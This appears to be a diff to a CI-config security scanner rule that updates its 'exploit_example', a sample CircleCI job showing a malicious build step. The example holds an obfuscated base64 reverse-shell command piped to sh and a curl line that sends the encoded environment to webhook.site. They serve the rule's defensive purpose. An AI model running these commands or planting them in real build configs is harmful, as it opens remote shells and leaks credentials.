@@ -37,11 +37,10 @@ RULE = Rule(
         "hit for teams that want to spot-check.",
     ),
     exploit_example=(
-        "# Vulnerable: a step body contains ``curl /tmp/.miner |\n"
-        "# bash`` or pipes a base64-decoded payload to ``sh``. A\n"
-        "# malicious PR (or a compromised co-maintainer) plants\n"
-        "# the crypto-miner / credential-stealer in the config\n"
-        "# itself; every subsequent build executes the payload.\n"
+        "# Vulnerable: a step body pipes a base64-decoded payload\n"
+        "# to ``sh``. A malicious PR (or a compromised co-maintainer)\n"
+        "# plants the reverse-shell loader in the config itself;\n"
+        "# every subsequent build executes the payload.\n"
         "version: 2.1\n"
         "jobs:\n"
         "  build:\n"
@@ -49,7 +48,7 @@ RULE = Rule(
         "      - image: alpine@sha256:abc123...\n"
         "    steps:\n"
         "      - run: |\n"
-        "          echo Z2g6Li4uIA== | base64 -d | sh   # obfuscated payload\n"
+        "          echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
         "          curl https://webhook.site/abc?env=$(env|base64)\n"
         "\n"
         "# Safe: the build does only what the build does. No\n"
